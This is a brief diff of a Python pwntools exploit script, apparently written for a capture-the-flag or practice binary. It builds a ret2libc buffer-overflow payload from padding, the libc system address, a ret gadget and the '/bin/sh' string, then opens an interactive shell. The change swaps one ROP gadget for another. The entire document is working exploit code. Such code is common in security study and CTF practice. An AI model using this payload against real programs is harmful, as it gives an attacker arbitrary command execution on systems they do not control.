@@ -35,7 +35,8 @@ def main():
 
     pop_edi = 0x00021e58 + libc.address
     ret = 0x000202cb + libc.address
-    payload = b'a'*72 + p32(libc.sym['system']) + p32(pop_edi) + p32(next(libc.search(b'/bin/sh')))
+    # payload = b'a'*72 + p32(libc.sym['system']) + p32(pop_edi) + p32(next(libc.search(b'/bin/sh')))
+    payload = b'a'*72 + p32(libc.sym['system']) + p32(ret) + p32(next(libc.search(b'/bin/sh')))
     p.send(payload)
 
     p.interactive()
